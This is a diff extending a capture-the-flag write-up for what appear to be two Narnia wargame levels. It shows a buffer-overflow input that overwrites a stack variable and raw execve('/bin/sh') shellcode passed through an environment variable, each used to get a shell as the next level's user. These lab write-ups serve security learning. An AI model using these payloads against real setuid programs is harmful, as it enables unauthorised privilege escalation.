@@ -32,4 +32,24 @@ int main(){
 Looking at the code we can see that if we overflow buf[20], it will overflow in to val. In order to get the shell, we need to make val contain 0xdeadbeef.
 I first entered `perl -e 'print "A"x20 . "\xef\xbe\xad\xde"' | ./narnia0`.  This passed the comparison and allowed the system("/bin/sh") line to execute, but the shell was immediately closed because I didn't have any input to give it. 
 Next, I modified my input to be `(perl -e 'print "A"x20 . "\xef\xbe\xad\xde"'; cat) | ./narnia0` which allowed me to keep the shell open (with the shell open as narnia1)
+#Level1
+```
+#include <stdio.h>
+
+int main(){
+        int (*ret)();
+
+        if(getenv("EGG")==NULL){
+                printf("Give me something to execute at the env-variable EGG\n");
+                exit(1);
+        }
+
+        printf("Trying to execute EGG!\n");
+        ret = getenv("EGG");
+        ret();
+
+        return 0;
+}
+```
+So this code is going to get an environmental variable and then execute it.  Therefore, we want to put some executable code in to an evironmental variable called EGG.  I used the shellcode for execve("/bin/sh") I found at http://shell-storm.org/shellcode/files/shellcode-811.php and issued the command `export EGG=`perl -e 'print "\x31\xc0\x50\x68\x2f\x2f\x73" . "\x68\x68\x2f\x62\x69\x6e\x89" . "\xe3\x89\xc1\x89\xc2\xb0\x0b" ."\xcd\x80\x31\xc0\x40\xcd\x80"'``.  When I ran the program, I was given a shell as narnia2.
 
